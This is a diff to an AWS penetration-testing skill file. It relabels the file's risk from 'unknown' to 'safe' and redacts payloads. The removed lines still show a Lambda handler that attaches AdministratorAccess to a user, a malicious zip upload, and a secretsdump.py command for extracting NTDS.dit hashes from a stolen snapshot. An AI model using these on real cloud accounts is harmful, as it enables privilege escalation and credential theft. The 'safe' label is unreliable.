@@ -1,7 +1,7 @@
 ---
 name: aws-penetration-testing
 description: "Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations."
-risk: unknown
+risk: safe
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -180,18 +180,14 @@ aws iam put-user-policy --user-name my_username \
 import boto3
 
 def lambda_handler(event, context):
-    client = boto3.client('iam')
-    response = client.attach_user_policy(
-        UserName='my_username',
-        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
-    )
+    [REDACTED_BOTO3_IAM_PRIVILEGE_ESCALATION_PAYLOAD]
     return response
 ```
 
 ```bash
 # Update Lambda code
 aws lambda update-function-code --function-name target_function \
-  --zip-file fileb://malicious.zip
+  --zip-file [REDACTED_MALICIOUS_ZIP]
 ```
 
 ---
@@ -294,7 +290,7 @@ sudo mount /dev/xvdf1 /mnt/stolen
 # 2. Share snapshot with attacker account
 # 3. Mount in attacker instance
 # 4. Extract NTDS.dit and SYSTEM
-secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
+[REDACTED_SECRETSDUMP_COMMAND]
 ```
 
 ---
